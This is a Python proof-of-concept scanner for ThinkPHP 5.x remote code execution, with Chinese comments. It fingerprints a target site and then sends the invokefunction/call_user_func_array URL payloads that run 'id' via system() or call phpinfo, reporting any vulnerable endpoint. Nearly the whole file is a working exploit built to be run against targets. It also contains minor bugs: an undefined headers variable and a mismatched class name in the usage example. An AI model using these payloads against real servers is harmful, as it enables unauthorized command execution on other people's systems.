import requests

'''
Thinkphp 系列漏洞
'''
class POC:
	"""docstring fos ThiokphpPOc"""
	def __init__(self, target):
		if not 'http' in target:
			self.target='http://'+target
		else:
			self.target=target
		self.headers={
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36'
		}
	def tp5_getrce(self,target):
		payload1=target+r'/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'
		payloads2=target+r'/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'

		try:
			res=requests.get(url=payload1,headers=self.headers).text
			if ('uid' in res) and ('gid' in res):
				print('发现目标Thinkphp5.X RCE---->%s'%payload1)
			
			else:
				res2=requests.get(url=payloads2,headers=headers).text
				if 'Server API' in res2 and 'System' in res2:
					print('发现目标Thinkphp5.X RCE---->%s'%payloads2)
		except Exception as e:
			pass

	def verify(self,target):
		try:
			res=requests.get(url=target,headers=self.headers).text
			if 'thinkphp' in res:
				self.tp5_getrce(target)
			else:
				pass
		except Exception as e:
			pass
		print('[*]3 poc done')
	def atack(self):
		print('[*]3 poc start')
		self.verify(self.target)

'''
target='http://192.168.209.155/public'
t=ThinkphpPoc(target)
t.atack()
'''